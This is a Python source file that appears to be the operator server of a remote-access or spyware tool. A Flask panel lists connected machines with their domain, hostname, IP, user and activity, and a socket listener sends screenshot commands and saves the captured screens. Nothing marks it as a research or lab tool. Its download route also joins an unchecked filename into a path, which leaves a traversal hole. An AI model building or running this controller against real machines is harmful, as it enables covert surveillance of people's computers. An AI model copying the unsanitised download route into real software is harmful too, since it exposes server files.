import os
import socket
import threading
from flask import Flask, render_template, jsonify, request, send_file
from PIL import Image

app = Flask(__name__)

clients_data = []
clients_sock = []


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/clients', methods=['GET'])
def get_clients():
    return jsonify(clients_data)


@app.route('/screenshot/<client_id>', methods=['POST'])
def request_screenshot(client_id):
    client_socket = next((client['socket'] for client in clients_sock if client['id'] == client_id), None)
    if client_socket:
        try:
            command = f"screenshot:{client_id}"
            client_socket.sendall(command.encode())
            return '', 200
        except Exception as e:
            print(f"Failed to send screenshot command to {client_id}: {e}")
            return '', 500
    else:
        print(f"Client {client_id} not found")
        return '', 404


@app.route('/download/<filename>', methods=['GET'])
def download_file(filename):
    directory = os.path.join('src')
    try:
        return send_file(os.path.join(directory, filename), as_attachment=True)
    except Exception as e:
        return f"Error downloading file: {e}", 500


def handle_client(client_socket, client_address):
    client_id = f"{client_address[0]}:{client_address[1]}"
    print(f"Connect from {client_id}")

    clients_data.append({
        "id": client_id,
        "Domain": "Unknown",
        "Machine": "Unknown",
        "IP": "Unknown",
        "User": "Unknown",
        "LastActivity": "Unknown"
    })

    clients_sock.append({
        "id": client_id,
        "socket": client_socket,
    })

    try:
        while True:
            data = client_socket.recv(1024)
            if not data:
                print(f"Connection closed by client {client_id}")
                break
            process_client_data(data, client_id, client_socket)
    except Exception as e:
        print(f"Error with client {client_id}: {e}")
    finally:
        client_socket.close()
        clients_data[:] = [client for client in clients_data if client["id"] != client_id]


def process_client_data(data, client_id, client_socket):
    if data.startswith(b"INFO:"):
        update_client_info(data.decode(), client_id)
    elif data.startswith(b"ACTIVITY:"):
        update_client_activity(data.decode(), client_id)
    else:
        save_screenshot_data(data, client_id, client_socket)


def update_client_info(info, client_id):
    parts = info[5:].split(", ")
    domain = parts[0].split(": ")[1]
    machine = parts[1].split(": ")[1]
    ip = parts[2].split(": ")[1]
    user = parts[3].split(": ")[1]

    for client in clients_data:
        if client["id"] == client_id:
            client["Domain"] = domain
            client["Machine"] = machine
            client["IP"] = ip
            client["User"] = user
            break


def update_client_activity(info, client_id):
    last_activity = info[5:].split(":")[2]
    for client in clients_data:
        if client["id"] == client_id:
            client["LastActivity"] = last_activity
            break


def save_screenshot_data(data, client_id, client_socket):
    dimensions = data.decode().split(',')
    bitmap_width = int(dimensions[0])
    bitmap_height = int(dimensions[1])

    data_size = bitmap_width * bitmap_height * 4
    screenshot_data = b''
    while len(screenshot_data) < data_size:
        packet = client_socket.recv(data_size - len(screenshot_data))
        if not packet:
            print(f"Failed to receive screenshot data from {client_id}")
            break
        screenshot_data += packet

    if len(screenshot_data) == data_size:
        try:
            img = Image.frombytes("RGB", (bitmap_width, bitmap_height), screenshot_data)
            directory = "src"
            if not os.path.exists(directory):
                os.makedirs(directory)
            file_path = os.path.join(directory, "screen.png")
            img.save(file_path)
            print(f"Screenshot saved for {client_id} at {file_path}")
        except Exception as e:
            print(f"Error saving screenshot: {e}")
    else:
        print(f"Incomplete screenshot data received: {len(screenshot_data)} bytes")


def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("127.0.0.1", 8080))
    server.listen(5)
    print("Server started on 127.0.0.1:8080")

    while True:
        client_socket, client_address = server.accept()
        client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address))
        client_thread.start()


if __name__ == "__main__":
    server_thread = threading.Thread(target=start_server)
    server_thread.start()

    app.run(host='0.0.0.0', port=5000)
